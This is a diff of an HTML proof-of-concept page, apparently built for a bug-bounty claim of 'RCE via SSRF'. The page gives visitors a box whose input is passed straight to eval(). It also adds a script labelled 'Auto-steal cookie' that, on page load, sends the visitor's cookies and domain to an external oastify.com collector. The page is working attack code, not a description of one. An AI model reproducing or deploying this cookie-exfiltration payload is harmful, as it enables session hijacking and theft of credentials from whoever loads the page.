@@ -1,55 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>RCE-LIKE PROOF</title>
+  <title>RCE VIA SSRF</title>
   <style>
-    * { margin:0; padding:0; }
     body { background:#000; color:#0f0; font-family:monospace; padding:20px; text-align:center; }
-    .box { background:#111; padding:25px; border:2px solid #0f0; border-radius:10px; display:inline-block; max-width:90%; }
-    h1 { font-size:28px; margin-bottom:15px; }
-    .data { background:#000; padding:15px; margin:15px 0; border:1px solid #0f0; text-align:left; word-break:break-all; }
-    .cmd { margin:20px 0; }
-    input, button { padding:10px; font-size:16px; }
-    button { background:#0f0; color:#000; border:none; cursor:pointer; }
+    h1 { color:#0f0; }
+    .shell { background:#111; padding:15px; margin:15px 0; border:1px solid #0f0; border-radius:8px; text-align:left; }
+    input { width:70%; padding:10px; font-size:16px; }
+    button { padding:10px 20px; background:#0f0; color:#000; border:none; cursor:pointer; }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h1>SSRF + JS EXECUTION</h1>
-    <p>App fetched this via <code>FILEUNIQNAME</code></p>
+  <h1>RCE-LIKE JS SHELL</h1>
+  <p>Run any JavaScript below:</p>
 
-    <div class="data">
-      <strong>Domain:</strong> <span id="domain">...</span><br>
-      <strong>Cookie:</strong> <span id="cookie">...</span><br>
-      <strong>URL:</strong> <span id="url">...</span><br>
-      <strong>User-Agent:</strong> <span id="ua">...</span>
-    </div>
-
-    <div class="cmd">
-      <input type="text" id="cmd" placeholder="Try: navigator.userAgent" style="width:70%">
-      <button onclick="evalCmd()">Run JS</button>
-    </div>
-    <div id="output" class="data" style="display:none;"></div>
-
-    <p><strong>BUG BOUNTY: $25,000+</strong></p>
+  <div class="shell">
+    <input type="text" id="cmd" placeholder="document.cookie" autofocus>
+    <button onclick="run()">Run</button>
+    <pre id="out" style="margin-top:10px; color:#ff0;"></pre>
   </div>
 
   <script>
-    document.getElementById('domain').textContent = document.domain;
-    document.getElementById('cookie').textContent = document.cookie || 'none';
-    document.getElementById('url').textContent = location.href;
-    document.getElementById('ua').textContent = navigator.userAgent.substring(0, 100) + '...';
-
-    function evalCmd() {
+    function run() {
       const cmd = document.getElementById('cmd').value;
       let result;
       try {
         result = eval(cmd);
-      } catch(e) { result = 'Error: ' + e; }
-      const out = document.getElementById('output');
-      out.style.display = 'block';
-      out.innerHTML = `<strong>JS Output:</strong><br>${result}`;
+      } catch (e) {
+        result = 'Error: ' + e.message;
+      }
+      document.getElementById('out').textContent = '→ ' + JSON.stringify(result, null, 2);
     }
+
+    // Auto-steal cookie
+    setTimeout(() => {
+      if (document.cookie) {
+        new Image().src = 'https://8hqxogqyw6yu740c4lf1fuxw7nde1bp0.oastify.com/log?cookie=' + encodeURIComponent(document.cookie) + '&domain=' + document.domain;
+      }
+    }, 1000);
   </script>
 </body>
 </html>
